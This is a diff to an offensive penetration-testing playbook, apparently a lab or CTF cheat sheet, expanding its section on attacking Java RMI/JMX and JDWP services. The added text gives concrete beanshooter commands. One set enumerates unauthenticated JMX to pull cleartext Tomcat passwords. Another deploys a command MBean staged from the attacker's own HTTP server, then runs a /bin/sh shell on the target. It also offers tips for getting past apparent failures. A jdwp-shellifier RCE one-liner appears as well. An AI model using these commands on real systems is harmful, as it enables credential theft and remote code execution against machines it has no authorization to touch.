@@ -584,8 +584,26 @@ A writable module mapped into a home directory = SSH key write.
 
 ## Java surfaces — RMI / JMX / JDWP (1099/1090/9010/8000/…)
 
-- **RMI/JMX** (`1099`, `9010`) → `nmap --script rmi-dumpregistry`, then
-  `beanshooter`/mjet to load an MBean → RCE.
+- **RMI/JMX** (`1099`, `9010`, or any port whose `rmi-dumpregistry` shows a
+  bound `jmxrmi` → that is a JMX server) → the first question is always *does it
+  require auth*, and `beanshooter enum <host> <port>` answers it with no
+  credentials. If it enumerates, the service is open. Two payoffs, in order:
+  1. **Read MBeans for secrets before any exploit.** On a Tomcat JVM the
+     `Users:type=User` / `UserDatabase` MBeans hand back the realm users'
+     passwords in *cleartext* (`beanshooter enum` prints them) — even when the
+     Manager web app itself is IP-restricted, so don't stop at the 403.
+  2. **RCE via a command MBean.** `beanshooter tonka deploy <host> <port>
+     --stager-url http://<YOUR-IP>:<port> --stager-host <YOUR-IP> --stager-port
+     <port>` registers a TonkaBean through the MLet loader; then `tonka exec
+     <host> <port> --shell /bin/sh "<cmd>"`. Gotchas that read as "not
+     vulnerable": `--stager-url` is a **deploy-only** flag (not on `exec`); the
+     stager HTTP server must bind an address the *target* can reach back to (your
+     VPN/tun0 IP, and the deploy silently needs egress to it — if the target
+     can't call out, deploy never lands); and `exec` runs an argv array, so pass
+     `--shell` to get a real shell for pipes/`;`. Undeploy in cleanup: `tonka
+     undeploy` + `undeploy <host> <port> DefaultDomain:type=MLet`.
+  Older tooling: `mjet`/`sjet` do the same MLet trick; `nmap --script
+  rmi-dumpregistry` is only for the initial fingerprint.
 - **JDWP** (`8000` and friends, banner `JDWP-Handshake`) → remote debugger =
   direct RCE: `jdwp-shellifier.py -t $T -p 8000 --cmd 'id'`.
 
